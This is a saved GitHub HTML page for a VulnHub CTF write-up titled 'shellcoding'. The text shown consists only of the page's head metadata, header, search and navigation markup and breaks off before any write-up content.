<!DOCTYPE html>
<!-- saved from url=(0080)https://github.com/VulnHub/ctf-writeups/blob/master/2015/ringzer0/shellcoding.md -->
<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    
  <link rel="dns-prefetch" href="https://github.githubassets.com/">
  <link rel="dns-prefetch" href="https://avatars0.githubusercontent.com/">
  <link rel="dns-prefetch" href="https://avatars1.githubusercontent.com/">
  <link rel="dns-prefetch" href="https://avatars2.githubusercontent.com/">
  <link rel="dns-prefetch" href="https://avatars3.githubusercontent.com/">
  <link rel="dns-prefetch" href="https://github-cloud.s3.amazonaws.com/">
  <link rel="dns-prefetch" href="https://user-images.githubusercontent.com/">



  <link crossorigin="anonymous" media="all" integrity="sha512-dsqgdBtnWun6oxDg9q1xezEyITXQ8QsMdFm+JDoDk6Tzx9AEE1XcUEhWff/M2Jv85ucTVJCjp/2fGbh6Omtrgg==" rel="stylesheet" href="./shellcode_files/frameworks-41c2037bf12f1e46d8f08b88a04a8d8f.css">
  
    <link crossorigin="anonymous" media="all" integrity="sha512-TqS+kfFRn+NEcrFL7N4YDv/YUserZ94bE4kpbW/BzPsU8JujIKBUXV7DYMFG6H1FjBDYVPr0N8pk09Tzl15dDA==" rel="stylesheet" href="./shellcode_files/github-3be7a33928202f4784cddb229421674d.css">
    
    
    
    

  <meta name="viewport" content="width=device-width">
  
  <title>ctf-writeups/shellcoding.md at master · VulnHub/ctf-writeups</title>
    <meta name="description" content="CTF write-ups from the VulnHub CTF Team. Contribute to VulnHub/ctf-writeups development by creating an account on GitHub.">
    <link rel="search" type="application/opensearchdescription+xml" href="https://github.com/opensearch.xml" title="GitHub">
  <link rel="fluid-icon" href="https://github.com/fluidicon.png" title="GitHub">
  <meta property="fb:app_id" content="1401488693436528">

    <meta name="twitter:image:src" content="https://avatars1.githubusercontent.com/u/14081133?s=400&amp;v=4"><meta name="twitter:site" content="@github"><meta name="twitter:card" content="summary"><meta name="twitter:title" content="VulnHub/ctf-writeups"><meta name="twitter:description" content="CTF write-ups from the VulnHub CTF Team. Contribute to VulnHub/ctf-writeups development by creating an account on GitHub.">
    <meta property="og:image" content="https://avatars1.githubusercontent.com/u/14081133?s=400&amp;v=4"><meta property="og:site_name" content="GitHub"><meta property="og:type" content="object"><meta property="og:title" content="VulnHub/ctf-writeups"><meta property="og:url" content="https://github.com/VulnHub/ctf-writeups"><meta property="og:description" content="CTF write-ups from the VulnHub CTF Team. Contribute to VulnHub/ctf-writeups development by creating an account on GitHub.">

  <link rel="assets" href="https://github.githubassets.com/">
  <link rel="web-socket" href="wss://live.github.com/_sockets/VjI6NDEyODcxMjM5OjU2YzhjMjlkMDhlODJmNTRhYzVhZGYwMWZlZjg0ODE1YmVhMDkxODUwZDFiNzNiMWNjNWY2MjMzODZiYmFhYzc=--cd8d4f080f3f1f0ddb0af77e15254cdbff054a9a">
  <meta name="pjax-timeout" content="1000">
  <link rel="sudo-modal" href="https://github.com/sessions/sudo_modal">
  <meta name="request-id" content="AD6C:73A5:197621:2A7FAD:5D08F86D" data-pjax-transient="">


  

  <meta name="selected-link" value="repo_source" data-pjax-transient="">

      <meta name="google-site-verification" content="KT5gs8h0wvaagLKAVWq8bbeNwnZZK1r1XQysX3xurLU">
    <meta name="google-site-verification" content="ZzhVyEFwb7w3e0-uOTltm8Jsck2F5StVihD0exw2fsA">
    <meta name="google-site-verification" content="GXs5KoUUkNCoaAZn7wPN-t01Pywp9M3sEjnt_3_ZWPc">

  <meta name="octolytics-host" content="collector.githubapp.com"><meta name="octolytics-app-id" content="github"><meta name="octolytics-event-url" content="https://collector.githubapp.com/github-external/browser_event"><meta name="octolytics-dimension-request_id" content="AD6C:73A5:197621:2A7FAD:5D08F86D"><meta name="octolytics-dimension-region_edge" content="iad"><meta name="octolytics-dimension-region_render" content="iad"><meta name="octolytics-actor-id" content="32180077"><meta name="octolytics-actor-login" content="chase1635321"><meta name="octolytics-actor-hash" content="dad6eaccac31f9a9efda77746297786c44ea290b8e76531107d9ffd866a1b260">
<meta name="analytics-location" content="/&lt;user-name&gt;/&lt;repo-name&gt;/blob/show" data-pjax-transient="true">



    <meta name="google-analytics" content="UA-3769691-2">

  <meta class="js-ga-set" name="userId" content="4253a29340861a19c5f03684952984a9">

<meta class="js-ga-set" name="dimension1" content="Logged In">



  

      <meta name="hostname" content="github.com">
    <meta name="user-login" content="chase1635321">

      <meta name="expected-hostname" content="github.com">
    <meta name="js-proxy-site-detection-payload" content="ZTg1NzdkMWFhMWQ4OGE3YjU4NmNiOWRhNWM5MzA3MGIzMTBjN2NjZjU2NTYyNjVlZjAwNDM4YWI4NzU0MzNjZXx7InJlbW90ZV9hZGRyZXNzIjoiMTI4LjguMTk1LjE1IiwicmVxdWVzdF9pZCI6IkFENkM6NzNBNToxOTc2MjE6MkE3RkFEOjVEMDhGODZEIiwidGltZXN0YW1wIjoxNTYwODY5MDAyLCJob3N0IjoiZ2l0aHViLmNvbSJ9">

    <meta name="enabled-features" content="UNIVERSE_BANNER,MARKETPLACE_FEATURED_BLOG_POSTS,MARKETPLACE_INVOICED_BILLING,MARKETPLACE_SOCIAL_PROOF_CUSTOMERS,MARKETPLACE_TRENDING_SOCIAL_PROOF,MARKETPLACE_RECOMMENDATIONS,MARKETPLACE_PULL_PANDA_HOMEPAGE,NOTIFY_ON_BLOCK,RELATED_ISSUES">

  <meta name="html-safe-nonce" content="f5c6033b241361566863fa563fe9c2599b164746">

  <meta http-equiv="x-pjax-version" content="d07f4d9d3d473f18a54d9d0c761c1d41">
  

      <link href="https://github.com/VulnHub/ctf-writeups/commits/master.atom" rel="alternate" title="Recent Commits to ctf-writeups:master" type="application/atom+xml">

  <meta name="go-import" content="github.com/VulnHub/ctf-writeups git https://github.com/VulnHub/ctf-writeups.git">

  <meta name="octolytics-dimension-user_id" content="14081133"><meta name="octolytics-dimension-user_login" content="VulnHub"><meta name="octolytics-dimension-repository_id" content="51316387"><meta name="octolytics-dimension-repository_nwo" content="VulnHub/ctf-writeups"><meta name="octolytics-dimension-repository_public" content="true"><meta name="octolytics-dimension-repository_is_fork" content="false"><meta name="octolytics-dimension-repository_network_root_id" content="51316387"><meta name="octolytics-dimension-repository_network_root_nwo" content="VulnHub/ctf-writeups"><meta name="octolytics-dimension-repository_explore_github_marketplace_ci_cta_shown" content="false">


    <link rel="canonical" href="https://github.com/VulnHub/ctf-writeups/blob/master/2015/ringzer0/shellcoding.md" data-pjax-transient="">


  <meta name="browser-stats-url" content="https://api.github.com/_private/browser/stats">

  <meta name="browser-errors-url" content="https://api.github.com/_private/browser/errors">

  <link rel="mask-icon" href="https://github.githubassets.com/pinned-octocat.svg" color="#000000">
  <link rel="icon" type="image/x-icon" class="js-site-favicon" href="https://github.githubassets.com/favicon.ico">

<meta name="theme-color" content="#1e2327">


  <meta name="u2f-enabled" content="true">



  <link rel="manifest" href="https://github.com/manifest.json" crossorigin="use-credentials">

  <style id="holderjs-style" type="text/css"></style></head>

  <body class="logged-in env-production page-responsive page-blob __plain_text_READY__ __plain_text__ __text_mode_img_1__ __text_mode_desaturated__ __text_mode_white_bg__ vsc-initialized intent-mouse">
    

  <div class="position-relative js-header-wrapper ">
    <a href="https://github.com/VulnHub/ctf-writeups/blob/master/2015/ringzer0/shellcoding.md#start-of-content" tabindex="1" class="p-3 bg-blue text-white show-on-focus js-skip-to-content">Skip to content</a>
    <div id="js-pjax-loader-bar" class="pjax-loader-bar"><div class="progress"></div></div>

    
    
    


          <header class="Header js-details-container Details flex-wrap flex-lg-nowrap p-responsive" role="banner">

    <div class="Header-item d-none d-lg-flex">
      <a class="Header-link" href="https://github.com/" data-hotkey="g d" aria-label="Homepage" data-ga-click="Header, go to dashboard, icon:logo">
  <svg class="octicon octicon-mark-github v-align-middle" height="32" viewBox="0 0 16 16" version="1.1" width="32" aria-hidden="true"><path fill-rule="evenodd" d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.013 8.013 0 0 0 16 8c0-4.42-3.58-8-8-8z"></path></svg>
</a>

    </div>

    <div class="Header-item d-lg-none">
      <button class="Header-link btn-link js-details-target" type="button" aria-label="Toggle navigation" aria-expanded="false">
        <svg height="24" class="octicon octicon-three-bars" viewBox="0 0 12 16" version="1.1" width="18" aria-hidden="true"><path fill-rule="evenodd" d="M11.41 9H.59C0 9 0 8.59 0 8c0-.59 0-1 .59-1H11.4c.59 0 .59.41.59 1 0 .59 0 1-.59 1h.01zm0-4H.59C0 5 0 4.59 0 4c0-.59 0-1 .59-1H11.4c.59 0 .59.41.59 1 0 .59 0 1-.59 1h.01zM.59 11H11.4c.59 0 .59.41.59 1 0 .59 0 1-.59 1H.59C0 13 0 12.59 0 12c0-.59 0-1 .59-1z"></path></svg>
      </button>
    </div>

    <div class="Header-item Header-item--full flex-column flex-lg-row width-full flex-order-2 flex-lg-order-none mr-0 mr-lg-3 mt-3 mt-lg-0 Details-content--hidden">
        <div class="header-search flex-self-stretch flex-lg-self-auto mr-0 mr-lg-3 mb-3 mb-lg-0 scoped-search site-scoped-search js-site-search position-relative js-jump-to" role="combobox" aria-owns="jump-to-results" aria-label="Search or jump to" aria-haspopup="listbox" aria-expanded="false">
  <div class="position-relative">
    <!-- '"` --><!-- </textarea></xmp> --><form class="js-site-search-form" role="search" aria-label="Site" data-scope-type="Repository" data-scope-id="51316387" data-scoped-search-url="/VulnHub/ctf-writeups/search" data-unscoped-search-url="/search" action="https://github.com/VulnHub/ctf-writeups/search" accept-charset="UTF-8" method="get"><input name="utf8" type="hidden" value="✓">
      <label class="form-control input-sm header-search-wrapper p-0 header-search-wrapper-jump-to position-relative d-flex flex-justify-between flex-items-center js-chromeless-input-container">
        <input type="text" class="form-control input-sm header-search-input jump-to-field js-jump-to-field js-site-search-focus js-site-search-field is-clearable" data-hotkey="s,/" name="q" value="" placeholder="Search or jump to…" data-unscoped-placeholder="Search or jump to…" data-scoped-placeholder="Search or jump to…" autocapitalize="off" aria-autocomplete="list" aria-controls="jump-to-results" aria-label="Search or jump to…" data-jump-to-suggestions-path="/_graphql/GetSuggestedNavigationDestinations#csrf-token=8bkNllxLoyK5w2pUlPMTH+SJq7L7YevwpOJ9ayi3g+wzivOvdg2B52BK3NYPfGKqDdcXjqgegysVPoncvxU0yw==" spellcheck="false" autocomplete="off">
          <input type="hidden" class="js-site-search-type-field" name="type">
            <img src="./shellcode_files/search-key-slash.svg" alt="" class="mr-2 header-search-key-slash">

            <div class="Box position-absolute overflow-hidden d-none jump-to-suggestions js-jump-to-suggestions-container">
              
<ul class="d-none js-jump-to-suggestions-template-container">
  

<li class="d-flex flex-justify-start flex-items-center p-0 f5 navigation-item js-navigation-item js-jump-to-suggestion" role="option">
  <a tabindex="-1" class="no-underline d-flex flex-auto flex-items-center jump-to-suggestions-path js-jump-to-suggestion-path js-navigation-open p-2" href="https://github.com/VulnHub/ctf-writeups/blob/master/2015/ringzer0/shellcoding.md">
    <div class="jump-to-octicon js-jump-to-octicon flex-shrink-0 mr-2 text-center d-none">
      <svg height="16" width="16" class="octicon octicon-repo flex-shrink-0 js-jump-to-octicon-repo d-none" title="Repository" aria-label="Repository" viewBox="0 0 12 16" version="1.1" role="img"><path fill-rule="evenodd" d="M4 9H3V8h1v1zm0-3H3v1h1V6zm0-2H3v1h1V4zm0-2H3v1h1V2zm8-1v12c0 .55-.45 1-1 1H6v2l-1.5-1.5L3 16v-2H1c-.55 0-1-.45-1-1V1c0-.55.45-1 1-1h10c.55 0 1 .45 1 1zm-1 10H1v2h2v-1h3v1h5v-2zm0-10H2v9h9V1z"></path></svg>
      <svg height="16" width="16" class="octicon octicon-project flex-shrink-0 js-jump-to-octicon-project d-none" title="Project" aria-label="Project" viewBox="0 0 15 16" version="1.1" role="img"><path fill-rule="evenodd" d="M10 12h3V2h-3v10zm-4-2h3V2H6v8zm-4 4h3V2H2v12zm-1 1h13V1H1v14zM14 0H1a1 1 0 0 0-1 1v14a1 1 0 0 0 1 1h13a1 1 0 0 0 1-1V1a1 1 0 0 0-1-1z"></path></svg>
      <svg height="16" width="16" class="octicon octicon-search flex-shrink-0 js-jump-to-octicon-search d-none" title="Search" aria-label="Search" viewBox="0 0 16 16" version="1.1" role="img"><path fill-rule="evenodd" d="M15.7 13.3l-3.81-3.83A5.93 5.93 0 0 0 13 6c0-3.31-2.69-6-6-6S1 2.69 1 6s2.69 6 6 6c1.3 0 2.48-.41 3.47-1.11l3.83 3.81c.19.2.45.3.7.3.25 0 .52-.09.7-.3a.996.996 0 0 0 0-1.41v.01zM7 10.7c-2.59 0-4.7-2.11-4.7-4.7 0-2.59 2.11-4.7 4.7-4.7 2.59 0 4.7 2.11 4.7 4.7 0 2.59-2.11 4.7-4.7 4.7z"></path></svg>
    </div>

    <img class="avatar mr-2 flex-shrink-0 js-jump-to-suggestion-avatar d-none" alt="" aria-label="Team" src="https://github.com/VulnHub/ctf-writeups/blob/master/2015/ringzer0/shellcoding.md" width="28" height="28">

    <div class="jump-to-suggestion-name js-jump-to-suggestion-name flex-auto overflow-hidden text-left no-wrap css-truncate css-truncate-target">
    </div>

    <div class="border rounded-1 flex-shrink-0 bg-gray px-1 text-gray-light ml-1 f6 d-none js-jump-to-badge-search">
      <span class="js-jump-to-badge-search-text-default d-none" aria-label="in this repository">
        In this repository
      </span>
      <span class="js-jump-to-badge-search-text-global d-none" aria-label="in all of GitHub">
        All GitHub
      </span>
      <span aria-hidden="true" class="d-inline-block ml-1 v-align-middle">↵</span>
    </div>

    <div aria-hidden="true" class="border rounded-1 flex-shrink-0 bg-gray px-1 text-gray-light ml-1 f6 d-none d-on-nav-focus js-jump-to-badge-jump">
      Jump to
      <span class="d-inline-block ml-1 v-align-middle">↵</span>
    </div>
  </a>
</li>

</ul>

<ul class="d-none js-jump-to-no-results-template-container">
  <li class="d-flex flex-justify-center flex-items-center f5 d-none js-jump-to-suggestion p-2">
    <span class="text-gray">No suggested jump to results</span>
  </li>
</ul>

<ul id="jump-to-results" role="listbox" class="p-0 m-0 js-navigation-container jump-to-suggestions-results-container js-jump-to-suggestions-results-container">
  

<li class="d-flex flex-justify-start flex-items-center p-0 f5 navigation-item js-navigation-item js-jump-to-scoped-search d-none" role="option">
  <a tabindex="-1" class="no-underline d-flex flex-auto flex-items-center jump-to-suggestions-path js-jump-to-suggestion-path js-navigation-open p-2" href="https://github.com/VulnHub/ctf-writeups/blob/master/2015/ringzer0/shellcoding.md">
    <div class="jump-to-octicon js-jump-to-octicon flex-shrink-0 mr-2 text-center d-none">
      <svg height="16" width="16" class="octicon octicon-repo flex-shrink-0 js-jump-to-octicon-repo d-none" title="Repository" aria-label="Repository" viewBox="0 0 12 16" version="1.1" role="img"><path fill-rule="evenodd" d="M4 9H3V8h1v1zm0-3H3v1h1V6zm0-2H3v1h1V4zm0-2H3v1h1V2zm8-1v12c0 .55-.45 1-1 1H6v2l-1.5-1.5L3 16v-2H1c-.55 0-1-.45-1-1V1c0-.55.45-1 1-1h10c.55 0 1 .45 1 1zm-1 10H1v2h2v-1h3v1h5v-2zm0-10H2v9h9V1z"></path></svg>
      <svg height="16" width="16" class="octicon octicon-project flex-shrink-0 js-jump-to-octicon-project d-none" title="Project" aria-label="Project" viewBox="0 0 15 16" version="1.1" role="img"><path fill-rule="evenodd" d="M10 12h3V2h-3v10zm-4-2h3V2H6v8zm-4 4h3V2H2v12zm-1 1h13V1H1v14zM14 0H1a1 1 0 0 0-1 1v14a1 1 0 0 0 1 1h13a1 1 0 0 0 1-1V1a1 1 0 0 0-1-1z"></path></svg>
      <svg height="16" width="16" class="octicon octicon-search flex-shrink-0 js-jump-to-octicon-search d-none" title="Search" aria-label="Search" viewBox="0 0 16 16" version="1.1" role="img"><path fill-rule="evenodd" d="M15.7 13.3l-3.81-3.83A5.93 5.93 0 0 0 13 6c0-3.31-2.69-6-6-6S1 2.69 1 6s2.69 6 6 6c1.3 0 2.48-.41 3.47-1.11l3.83 3.81c.19.2.45.3.7.3.25 0 .52-.09.7-.3a.996.996 0 0 0 0-1.41v.01zM7 10.7c-2.59 0-4.7-2.11-4.7-4.7 0-2.59 2.11-4.7 4.7-4.7 2.59 0 4.7 2.11 4.7 4.7 0 2.59-2.11 4.7-4.7 4.7z"></path></svg>
    </div>

    <img class="avatar mr-2 flex-shrink-0 js-jump-to-suggestion-avatar d-none" alt="" aria-label="Team" src="https://github.com/VulnHub/ctf-writeups/blob/master/2015/ringzer0/shellcoding.md" width="28" height="28">

    <div class="jump-to-suggestion-name js-jump-to-suggestion-name flex-auto overflow-hidden text-left no-wrap css-truncate css-truncate-target">
    </div>

    <div class="border rounded-1 flex-shrink-0 bg-gray px-1 text-gray-light ml-1 f6 d-none js-jump-to-badge-search">
      <span class="js-jump-to-badge-search-text-default d-none" aria-label="in this repository">
        In this repository
      </span>
      <span class="js-jump-to-badge-search-text-global d-none" aria-label="in all of GitHub">
        All GitHub
      </span>
      <span aria-hidden="true" class="d-inline-block ml-1 v-align-middle">↵</span>
    </div>

    <div aria-hidden="true" class="border rounded-1 flex-shrink-0 bg-gray px-1 text-gray-light ml-1 f6 d-none d-on-nav-focus js-jump-to-badge-jump">
      Jump to
      <span class="d-inline-block ml-1 v-align-middle">↵</span>
    </div>
  </a>
</li>

  

<li class="d-flex flex-justify-start flex-items-center p-0 f5 navigation-item js-navigation-item js-jump-to-global-search d-none" role="option">
  <a tabindex="-1" class="no-underline d-flex flex-auto flex-items-center jump-to-suggestions-path js-jump-to-suggestion-path js-navigation-open p-2" href="https://github.com/VulnHub/ctf-writeups/blob/master/2015/ringzer0/shellcoding.md">
    <div class="jump-to-octicon js-jump-to-octicon flex-shrink-0 mr-2 text-center d-none">
      <svg height="16" width="16" class="octicon octicon-repo flex-shrink-0 js-jump-to-octicon-repo d-none" title="Repository" aria-label="Repository" viewBox="0 0 12 16" version="1.1" role="img"><path fill-rule="evenodd" d="M4 9H3V8h1v1zm0-3H3v1h1V6zm0-2H3v1h1V4zm0-2H3v1h1V2zm8-1v12c0 .55-.45 1-1 1H6v2l-1.5-1.5L3 16v-2H1c-.55 0-1-.45-1-1V1c0-.55.45-1 1-1h10c.55 0 1 .45 1 1zm-1 10H1v2h2v-1h3v1h5v-2zm0-10H2v9h9V1z"></path></svg>
      <svg height="16" width="16" class="octicon octicon-project flex-shrink-0 js-jump-to-octicon-project d-none" title="Project" aria-label="Project" viewBox="0 0 15 16" version="1.1" role="img"><path fill-rule="evenodd" d="M10 12h3V2h-3v10zm-4-2h3V2H6v8zm-4 4h3V2H2v12zm-1 1h13V1H1v14zM14 0H1a1 1 0 0 0-1 1v14a1 1 0 0 0 1 1h13a1 1 0 0 0 1-1V1a1 1 0 0 0-1-1z"></path></svg>
      <svg height="16" width="16" class="octicon octicon-search flex-shrink-0 js-jump-to-octicon-search d-none" title="Search" aria-label="Search" viewBox="0 0 16 16" version="1.1" role="img"><path fill-rule="evenodd" d="M15.7 13.3l-3.81-3.83A5.93 5.93 0 0 0 13 6c0-3.31-2.69-6-6-6S1 2.69 1 6s2.69 6 6 6c1.3 0 2.48-.41 3.47-1.11l3.83 3.81c.19.2.45.3.7.3.25 0 .52-.09.7-.3a.996.996 0 0 0 0-1.41v.01zM7 10.7c-2.59 0-4.7-2.11-4.7-4.7 0-2.59 2.11-4.7 4.7-4.7 2.59 0 4.7 2.11 4.7 4.7 0 2.59-2.11 4.7-4.7 4.7z"></path></svg>
    </div>

    <img class="avatar mr-2 flex-shrink-0 js-jump-to-suggestion-avatar d-none" alt="" aria-label="Team" src="https://github.com/VulnHub/ctf-writeups/blob/master/2015/ringzer0/shellcoding.md" width="28" height="28">

    <div class="jump-to-suggestion-name js-jump-to-suggestion-name flex-auto overflow-hidden text-left no-wrap css-truncate css-truncate-target">
    </div>

    <div class="border rounded-1 flex-shrink-0 bg-gray px-1 text-gray-light ml-1 f6 d-none js-jump-to-badge-search">
      <span class="js-jump-to-badge-search-text-default d-none" aria-label="in this repository">
        In this repository
      </span>
      <span class="js-jump-to-badge-search-text-global d-none" aria-label="in all of GitHub">
        All GitHub
      </span>
      <span aria-hidden="true" class="d-inline-block ml-1 v-align-middle">↵</span>
    </div>

    <div aria-hidden="true" class="border rounded-1 flex-shrink-0 bg-gray px-1 text-gray-light ml-1 f6 d-none d-on-nav-focus js-jump-to-badge-jump">
      Jump to
      <span class="d-inline-block ml-1 v-align-middle">↵</span>
    </div>
  </a>
</li>


    <li class="d-flex flex-justify-center flex-items-center p-0 f5 js-jump-to-suggestion">
      <img src="./shellcode_files/octocat-spinner-128.gif" alt="Octocat Spinner Icon" class="m-2" width="28">
    </li>
</ul>

            </div>
      </label>
</form>  </div>
</div>


      <nav class="d-flex flex-column flex-lg-row flex-self-stretch flex-lg-self-auto" aria-label="Global">
    <a class="Header-link d-block d-lg-none py-2 py-lg-0 border-top border-lg-top-0 border-white-fade-15" data-ga-click="Header, click, Nav menu - item:dashboard:user" aria-label="Dashboard" href="https://github.com/dashboard">
      Dashboard
</a>
  <a class="js-selected-navigation-item Header-link  mr-0 mr-lg-3 py-2 py-lg-0 border-top border-lg-top-0 border-white-fade-15" data-hotkey="g p" data-ga-click="Header, click, Nav menu - item:pulls context:user" aria-label="Pull requests you created" data-selected-links="/pulls /pulls/assigned /pulls/mentioned /pulls" href="https://github.com/pulls">
    Pull requests
</a>
  <a class="js-selected-navigation-item Header-link  mr-0 mr-lg-3 py-2 py-lg-0 border-top border-lg-top-0 border-white-fade-15" data-hotkey="g i" data-ga-click="Header, click, Nav menu - item:issues context:user" aria-label="Issues you created" data-selected-links="/issues /issues/assigned /issues/mentioned /issues" href="https://github.com/issues">
    Issues
</a>
    <div class="mr-0 mr-lg-3 py-2 py-lg-0 border-top border-lg-top-0 border-white-fade-15">
      <a class="js-selected-navigation-item Header-link" data-ga-click="Header, click, Nav menu - item:marketplace context:user" data-octo-click="marketplace_click" data-octo-dimensions="location:nav_bar" data-selected-links=" /marketplace" href="https://github.com/marketplace">
        Marketplace
</a>      
    </div>

  <a class="js-selected-navigation-item Header-link  mr-0 mr-lg-3 py-2 py-lg-0 border-top border-lg-top-0 border-white-fade-15" data-ga-click="Header, click, Nav menu - item:explore" data-selected-links="/explore /trending /trending/developers /integrations /integrations/feature/code /integrations/feature/collaborate /integrations/feature/ship showcases showcases_search showcases_landing /explore" href="https://github.com/explore">
    Explore
</a>
    <a class="Header-link d-block d-lg-none mr-0 mr-lg-3 py-2 py-lg-0 border-top border-lg-top-0 border-white-fade-15" aria-label="View profile and more" aria-expanded="false" aria-haspopup="false" href="https://github.com/chase1635321">
      <img class="avatar" src="./shellcode_files/32180077" width="20" height="20" alt="@chase1635321">
      chase1635321
</a>
    <!-- '"` --><!-- </textarea></xmp> --><form action="https://github.com/logout" accept-charset="UTF-8" method="post"><input name="utf8" type="hidden" value="✓"><input type="hidden" name="authenticity_token" value="ttksNSG7UuL5B/D19q33UOEshlMk3zp13QQ+X/Z2fi8U+2q4G7P+9rPInYwwkbijXx3EUkSLaI+uMvkbTotAHg==">
      <button type="submit" class="Header-link mr-0 mr-lg-3 py-2 py-lg-0 border-top border-lg-top-0 border-white-fade-15 d-lg-none btn-link d-block width-full text-left" data-ga-click="Header, sign out, icon:logout" style="padding-left: 2px;">
        <svg class="octicon octicon-sign-out v-align-middle" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M12 9V7H8V5h4V3l4 3-4 3zm-2 3H6V3L2 1h8v3h1V1c0-.55-.45-1-1-1H1C.45 0 0 .45 0 1v11.38c0 .39.22.73.55.91L6 16.01V13h4c.55 0 1-.45 1-1V8h-1v4z"></path></svg>
        Sign out
      </button>
</form></nav>

    </div>

    <div class="Header-item Header-item--full flex-justify-center d-lg-none position-relative">
      <div class="css-truncate css-truncate-target width-fit position-absolute left-0 right-0 text-center">
              <svg class="octicon octicon-repo" viewBox="0 0 12 16" version="1.1" width="12" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9H3V8h1v1zm0-3H3v1h1V6zm0-2H3v1h1V4zm0-2H3v1h1V2zm8-1v12c0 .55-.45 1-1 1H6v2l-1.5-1.5L3 16v-2H1c-.55 0-1-.45-1-1V1c0-.55.45-1 1-1h10c.55 0 1 .45 1 1zm-1 10H1v2h2v-1h3v1h5v-2zm0-10H2v9h9V1z"></path></svg>
    <a class="Header-link" href="https://github.com/VulnHub">VulnHub</a>
    /
    <a class="Header-link" href="https://github.com/VulnHub/ctf-writeups">ctf-writeups</a>

</div>
    </div>

    <div class="Header-item position-relative d-none d-lg-flex">
      

    </div>

    <div class="Header-item mr-0 mr-lg-3 flex-order-1 flex-lg-order-none">
      

    <a aria-label="You have no unread notifications" class="Header-link notification-indicator position-relative tooltipped tooltipped-s js-socket-channel js-notification-indicator" data-hotkey="g n" data-ga-click="Header, go to notifications, icon:read" data-channel="notification-changed:32180077" href="https://github.com/notifications">
        <span class="mail-status "></span>
        <svg class="octicon octicon-bell" viewBox="0 0 14 16" version="1.1" width="14" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M14 12v1H0v-1l.73-.58c.77-.77.81-2.55 1.19-4.42C2.69 3.23 6 2 6 2c0-.55.45-1 1-1s1 .45 1 1c0 0 3.39 1.23 4.16 5 .38 1.88.42 3.66 1.19 4.42l.66.58H14zm-7 4c1.11 0 2-.89 2-2H5c0 1.11.89 2 2 2z"></path></svg>
</a>
    </div>


    <div class="Header-item position-relative d-none d-lg-flex">
      <details class="details-overlay details-reset">
  <summary class="Header-link" aria-label="Create new…" data-ga-click="Header, create new, icon:add" aria-haspopup="menu">
    <svg class="octicon octicon-plus" viewBox="0 0 12 16" version="1.1" width="12" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M12 9H7v5H5V9H0V7h5V2h2v5h5v2z"></path></svg> <span class="dropdown-caret"></span>
  </summary>
  <details-menu class="dropdown-menu dropdown-menu-sw" role="menu">
    
<a role="menuitem" class="dropdown-item" href="https://github.com/new" data-ga-click="Header, create new repository">
  New repository
</a>

  <a role="menuitem" class="dropdown-item" href="https://github.com/new/import" data-ga-click="Header, import a repository">
    Import repository
  </a>

<a role="menuitem" class="dropdown-item" href="https://gist.github.com/" data-ga-click="Header, create new gist">
  New gist
</a>

  <a role="menuitem" class="dropdown-item" href="https://github.com/organizations/new" data-ga-click="Header, create new organization">
    New organization
  </a>




  </details-menu>
</details>

    </div>

    <div class="Header-item position-relative mr-0 d-none d-lg-flex">
      
<details class="details-overlay details-reset">
  <summary class="Header-link" aria-label="View profile and more" data-ga-click="Header, show menu, icon:avatar" aria-haspopup="menu">
    <img alt="@chase1635321" class="avatar" src="./shellcode_files/32180077" height="20" width="20">
    <span class="dropdown-caret"></span>
  </summary>
  <details-menu class="dropdown-menu dropdown-menu-sw mt-2" style="width: 180px" role="menu">
    <div class="header-nav-current-user css-truncate"><a role="menuitem" class="no-underline user-profile-link px-3 pt-2 pb-2 mb-n2 mt-n1 d-block" href="https://github.com/chase1635321" data-ga-click="Header, go to profile, text:Signed in as">Signed in as <strong class="css-truncate-target">chase1635321</strong></a></div>
    <div role="none" class="dropdown-divider"></div>

      <div class="pl-3 pr-3 f6 user-status-container js-user-status-context pb-1" data-url="/users/status?compact=1&amp;link_mentions=0&amp;truncate=1">
        
<div class="js-user-status-container
    user-status-compact rounded-1 px-2 py-1 mt-2
    border
  " data-team-hovercards-enabled="">
  <details class="js-user-status-details details-reset details-overlay details-overlay-dark">
    <summary class="btn-link btn-block link-gray no-underline js-toggle-user-status-edit toggle-user-status-edit " aria-haspopup="dialog" role="button" data-hydro-click="{&quot;event_type&quot;:&quot;user_profile.click&quot;,&quot;payload&quot;:{&quot;profile_user_id&quot;:14081133,&quot;target&quot;:&quot;EDIT_USER_STATUS&quot;,&quot;user_id&quot;:32180077,&quot;client_id&quot;:&quot;1688231670.1559846310&quot;,&quot;originating_request_id&quot;:&quot;AD6C:73A5:197621:2A7FAD:5D08F86D&quot;,&quot;originating_url&quot;:&quot;https://github.com/VulnHub/ctf-writeups/blob/master/2015/ringzer0/shellcoding.md&quot;,&quot;referrer&quot;:&quot;https://www.google.com/&quot;}}" data-hydro-click-hmac="20b6777982722045498d03d6e9156cc25b73779fcd04468af3768a7373dafea5">
      <div class="d-flex">
        <div class="f6 lh-condensed user-status-header
          d-inline-block v-align-middle
            user-status-emoji-only-header circle
            pr-2
" style="max-width: 29px">
          <div class="user-status-emoji-container flex-shrink-0 mr-1 mt-1 lh-condensed-ultra v-align-bottom" style="">
